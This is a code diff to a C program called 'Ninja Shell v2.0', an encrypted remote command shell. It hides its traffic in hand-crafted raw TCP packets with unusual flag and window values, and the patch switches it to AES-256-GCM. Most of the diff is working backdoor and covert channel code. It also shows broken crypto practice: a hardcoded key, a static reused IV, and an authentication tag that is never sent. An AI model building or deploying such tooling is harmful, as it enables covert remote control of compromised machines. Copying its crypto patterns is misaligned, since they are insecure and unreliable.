@@ -43,12 +43,19 @@ Custom raw socket client shell use AES 256 CBC
 #include <openssl/pem.h>
 #include <openssl/evp.h>
 #include <openssl/aes.h>
+#include <openssl/rand.h>
 #define SIZE 50
 #define BUF 19
  
 #define PORT  667
 #define MAX    9192
 #define ERRO   -1
+
+ unsigned char key[]="magic1337";
+ unsigned char iv[16]="1234567890123456";
+ unsigned char aad[16]="abcdefghijklmnop"; //dummy
+ int k;
+
 char *encode64 (const void *b64_encode_this, int encode_this_many_bytes);
 char *decode64 (const void *b64_decode_this, int decode_this_many_bytes);
 void fazerpacote(char * dest_addr, unsigned short dest_port,char *payload); 
@@ -56,12 +63,14 @@ unsigned short in_cksum(unsigned short *, int);
 int orion_getHostByName(const char* name, char* buffer);  
 void listening_raw();
 void chomp(char * str);
-
-int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx, EVP_CIPHER_CTX *d_ctx);
-unsigned char *aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *len);
-unsigned char *aes_encrypt(EVP_CIPHER_CTX *e, unsigned char *plaintext, int *len);
+int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *aad, int aad_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext, unsigned char *tag);
+int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *aad, int aad_len, unsigned char *tag, unsigned char *key, unsigned char *iv, unsigned char *plaintext);
 
 
+void handleErrors()
+{
+  printf("Some error occured in  encryption function\n");
+}
 
 
 void init_serv()
@@ -78,24 +87,20 @@ void init_serv()
 
 int main(int argc, char *argv[]) 
 {
- char IP[16]; 
- char *destino=NULL,*input=NULL;
- EVP_CIPHER_CTX en, de;
- unsigned int salt[] = {13371, 17331};
- unsigned char *key_data=(unsigned char *)"Coolerudos key";
- int key_data_len=strlen("Coolerudos key");
+   char IP[16]; 
+   char *destino=NULL,*input=NULL;
 
-	if(argc < 2) 
-	{
-		puts("follow example ./proc host\n Ninja Shell v2.0\nCustom Raw socket client server shell using AES 256 cbc \n by Cooler_ \n contact: coolerlair[at]gmail[dot]com\n");
-		exit(0);    
-	}    
+  	if(argc < 2) 
+  	{
+  		puts("follow example ./proc host\n Ninja Shell v2.0\nCustom Raw socket client server shell using AES 256 cbc \n by Cooler_ \n contact: coolerlair[at]gmail[dot]com\n");
+  		exit(0);    
+  	}    
 
-	if(!orion_getHostByName(argv[1],IP))
-	{
-		puts("orion_gethostbyname() failed");
-		exit(1);
-	}
+  	if(!orion_getHostByName(argv[1],IP))
+  	{
+  		puts("orion_gethostbyname() failed");
+  		exit(1);
+  	}
 
 	fprintf(stdout,"\nIP: %s \n",IP);    
   //fprintf(stdout,"fate  : %s\n",argv[1]);    
@@ -105,35 +110,33 @@ int main(int argc, char *argv[])
 
 	init_serv();
 
- 	if(aes_init(key_data, key_data_len, (unsigned char *)&salt, &en, &de)) 
-	{
-		fprintf(stdout,"Error init AES cipher\n");
- 		return -1;
-	}
+  	while(1) 
+  	{     
+      unsigned char plaintext[1024],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[100],pt[1024+EVP_MAX_BLOCK_LENGTH];
 
-	while(1) 
-	{     
+   		input=(char *)malloc(MAX*sizeof(char)+1);
+  		bzero(input, MAX);
+  		fprintf(stdout,"CMD:");
+  	   	if(fgets(input,MAX,stdin)==NULL)
+  			   exit(0); 
+      chomp(input);
+      unsigned char *encode_64_input=encode64(input,strlen((char *)input));
+      k = encrypt(encode_64_input, strlen(encode_64_input), aad, sizeof(aad), key, iv, ciphertext, tag);
+     //       printf("Debug input ciphertext: %s --\n",ciphertext);
+      char *encode_64_output=encode64(ciphertext,strlen((char *)ciphertext));
+     //       printf("Debug input encode_64_output: %s --\n",encode_64_output);
 
- 		input=(char *)alloca(MAX*sizeof(char)+1);
-		bzero(input, MAX);
-		fprintf(stdout,"CMD:");
-	   	if(fgets(input,MAX,stdin)==NULL)
-			exit(0); 
-  // chomp(input);
-		int len4=strlen(input);
-		unsigned char *ciphertext=aes_encrypt(&en, (unsigned char *)input, &len4);
-		char *encode_64=encode64(ciphertext,strlen((char *)ciphertext));
-		fazerpacote(destino, PORT,encode_64);
-		free(encode_64);
-		free(ciphertext);
-
-		if(strstr(input,"die now"))
-		{
-    			break;
-		}
-   
-		sleep(2); 
-	}
+  		fazerpacote(destino, PORT,encode_64_output);
+  		free(encode_64_input);
+      free(encode_64_output);
+  		
+  		if(strstr(input,"die now"))
+  		{
+      			break;
+  		}
+     
+  		sleep(2); 
+  	}
  
  exit(1);
 }    
@@ -340,44 +343,32 @@ void listening_raw()
 	char buffer[MAX];
 // struct iphdr *iphr;
 	struct tcphdr *tcphr;
-	EVP_CIPHER_CTX en, de;
-// need change this...
-	unsigned int salt[] = {13371, 17331};
-
-// EDIT your key here
-	unsigned char *key_data=(unsigned char *)"Coolerudos key";
- 	int key_data_len=strlen("Coolerudos key");
-
-	if(aes_init(key_data, key_data_len, (unsigned char *)&salt, &en, &de)) 
-	{
-		fprintf(stdout,"Error init AES cipher\n");
-		exit(0);
-	}
 
  	tcphr = (struct tcphdr *) (buffer + sizeof(struct iphdr));
 
- 	if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == ERRO)
-  		exit(ERRO);
+   	if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == ERRO)
+    		exit(ERRO);
 
- 	while(read(sockfd, buffer, sizeof(buffer))) 
- 	{
-  		if((ntohs(tcphr->dest)==PORT)&&(tcphr->fin == 1)&&(tcphr->psh == 1) &&(tcphr->urg == 1) && (tcphr->window == htons(10666))) 
-  		{
-   			counter=sizeof(struct tcphdr) + sizeof(struct iphdr);
-			char *tmp=malloc(strlen(buffer)+counter+256);
-    			sprintf(tmp,"%s",buffer+counter);
-    			char *decode_64=decode64(tmp,strlen(tmp));
-    			free(tmp);
-    			char *plaintext=NULL;
-    			int lencode=strlen(decode_64)+1;
-    			plaintext=(char *)aes_decrypt(&de, (unsigned char *)decode_64,&lencode);
-    			fprintf(stdout,"result: %s \n",plaintext);
-    			free(decode_64);
-    			free(plaintext);
-  		}
+   	while(read(sockfd, buffer, sizeof(buffer))) 
+   	{
+    		if((ntohs(tcphr->dest)==PORT)&&(tcphr->fin == 1)&&(tcphr->psh == 1) &&(tcphr->urg == 1) && (tcphr->window == htons(10666))) 
+    		{
+          unsigned char plaintext[1024],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[100],pt[1024+EVP_MAX_BLOCK_LENGTH];
 
-  	//	bzero(buffer,MAX+sizeof(counter));
- 	}
+     			counter=sizeof(struct tcphdr) + sizeof(struct iphdr);
+      		unsigned char *decode_64_input=decode64(buffer+counter,strlen(buffer+counter));
+          k = decrypt(decode_64_input, strlen(decode_64_input), aad, sizeof(aad), tag, key, iv, pt);
+
+          char *decode_64_output=decode64(pt,strlen(pt)-4);
+          fprintf(stdout,"Result: %s \n",decode_64_output);
+
+
+// todo free the heap...  add xfree() function here
+
+
+    		}
+
+   	}
 
 }
 
@@ -435,54 +426,129 @@ char *decode64 (const void *b64_decode_this, int decode_this_many_bytes){
     	return base64_decoded;      
 }
 
-int 
-aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx, EVP_CIPHER_CTX *d_ctx)
+
+int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *aad,
+  int aad_len, unsigned char *key, unsigned char *iv,
+  unsigned char *ciphertext, unsigned char *tag)
 {
-  	int x=0, nrounds = 5;
-  	unsigned char key[32], iv[32];
-  
-  	x = EVP_BytesToKey(EVP_aes_128_xts(), EVP_sha1(), salt, key_data, key_data_len, nrounds, key, iv);
+  EVP_CIPHER_CTX *ctx;
 
-  	if(x != 32) 
-  	{
-    		fprintf(stdout,"Key size %d bits - should be 256 bits\n", x);
-    		return -1;
-  	}
+  int len=0, ciphertext_len=0;
 
-  	EVP_CIPHER_CTX_init(e_ctx);
-  	EVP_EncryptInit_ex(e_ctx, EVP_aes_128_xts(), NULL, key, iv);
-  	EVP_CIPHER_CTX_init(d_ctx);
-  	EVP_DecryptInit_ex(d_ctx, EVP_aes_128_xts(), NULL, key, iv);
+  /* Create and initialise the context */
+  if(!(ctx = EVP_CIPHER_CTX_new()))
+    handleErrors();
 
-  	return 0;
+  /* Initialise the encryption operation. */
+  if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
+    handleErrors();
+
+  /* Set IV length if default 12 bytes (96 bits) is not appropriate */
+  if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 16, NULL))
+    handleErrors();
+
+  /* Initialise key and IV */
+  if(1 != EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv)) handleErrors();
+
+  /* Provide any AAD data. This can be called zero or more times as
+   * required
+   */
+  if(1 != EVP_EncryptUpdate(ctx, NULL, &len, aad, aad_len))
+    handleErrors();
+
+  /* Provide the message to be encrypted, and obtain the encrypted output.
+   * EVP_EncryptUpdate can be called multiple times if necessary
+   */
+  /* encrypt in block lengths of 16 bytes */
+   while(ciphertext_len<=plaintext_len-16)
+   {
+    if(1 != EVP_EncryptUpdate(ctx, ciphertext+ciphertext_len, &len, plaintext+ciphertext_len, 16))
+      handleErrors();
+    ciphertext_len+=len;
+   }
+   if(1 != EVP_EncryptUpdate(ctx, ciphertext+ciphertext_len, &len, plaintext+ciphertext_len, plaintext_len-ciphertext_len))
+    handleErrors();
+   ciphertext_len+=len;
+
+  /* Finalise the encryption. Normally ciphertext bytes may be written at
+   * this stage, but this does not occur in GCM mode
+   */
+  if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + ciphertext_len, &len)) handleErrors();
+  ciphertext_len += len;
+
+  /* Get the tag */
+  if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag))
+    handleErrors();
+
+  /* Clean up */
+  EVP_CIPHER_CTX_free(ctx);
+
+  return ciphertext_len;
 }
 
-unsigned char 
-*aes_encrypt(EVP_CIPHER_CTX *e, unsigned char *plaintext, int *len)
+
+int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *aad,
+  int aad_len, unsigned char *tag, unsigned char *key, unsigned char *iv,
+  unsigned char *plaintext)
 {
-  	int c_len = *len + AES_BLOCK_SIZE, f_len = 0;
-  	unsigned char *ciphertext = malloc(c_len);
+  EVP_CIPHER_CTX *ctx;
+  int len=0, plaintext_len=0, ret;
 
-  	EVP_EncryptInit_ex(e, NULL, NULL, NULL, NULL);
-  	EVP_EncryptUpdate(e, ciphertext, &c_len, plaintext, *len);
-  	EVP_EncryptFinal_ex(e, ciphertext+c_len, &f_len);
+  /* Create and initialise the context */
+  if(!(ctx = EVP_CIPHER_CTX_new())) 
+    handleErrors();
 
-  	*len = c_len + f_len;
+  /* Initialise the decryption operation. */
+  if(!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
+    handleErrors();
 
-  	return ciphertext;
-}
+  /* Set IV length. Not necessary if this is 12 bytes (96 bits) */
+  if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 16, NULL))
+    handleErrors();
 
-unsigned char 
-*aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *len)
-{
-  	int p_len = *len, f_len = 0;
-  	unsigned char *plaintext = malloc(p_len + AES_BLOCK_SIZE);
-  
-  	EVP_DecryptInit_ex(e, NULL, NULL, NULL, NULL);
-  	EVP_DecryptUpdate(e, plaintext, &p_len, ciphertext, *len);
-  	EVP_DecryptFinal_ex(e, plaintext+p_len, &f_len);
+  /* Initialise key and IV */
+  if(!EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv)) handleErrors();
 
-  	*len = p_len + f_len;
+  /* Provide any AAD data. This can be called zero or more times as
+   * required
+   */
+  if(!EVP_DecryptUpdate(ctx, NULL, &len, aad, aad_len))
+    handleErrors();
 
-  	return plaintext;
+  /* Provide the message to be decrypted, and obtain the plaintext output.
+   * EVP_DecryptUpdate can be called multiple times if necessary
+   */
+   while(plaintext_len<=ciphertext_len-16)
+   {
+    if(1!=EVP_DecryptUpdate(ctx, plaintext+plaintext_len, &len, ciphertext+plaintext_len, 16))
+      handleErrors();
+    plaintext_len+=len;
+   }
+   if(1!=EVP_DecryptUpdate(ctx, plaintext+plaintext_len, &len, ciphertext+plaintext_len, ciphertext_len-plaintext_len))
+      handleErrors();
+   plaintext_len+=len;
+
+  /* Set expected tag value. Works in OpenSSL 1.0.1d and later */
+  if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag))
+    handleErrors();
+
+  /* Finalise the decryption. A positive return value indicates success,
+   * anything else is a failure - the plaintext is not trustworthy.
+   */
+  ret = EVP_DecryptFinal_ex(ctx, plaintext + plaintext_len, &len);
+
+  /* Clean up */
+  EVP_CIPHER_CTX_free(ctx);
+
+  if(ret > 0)
+  {
+    /* Success */
+    plaintext_len += len;
+    return plaintext_len;
+  }
+  else
+  {
+    /* Verify failed */
+    return -1;
+  }
 }
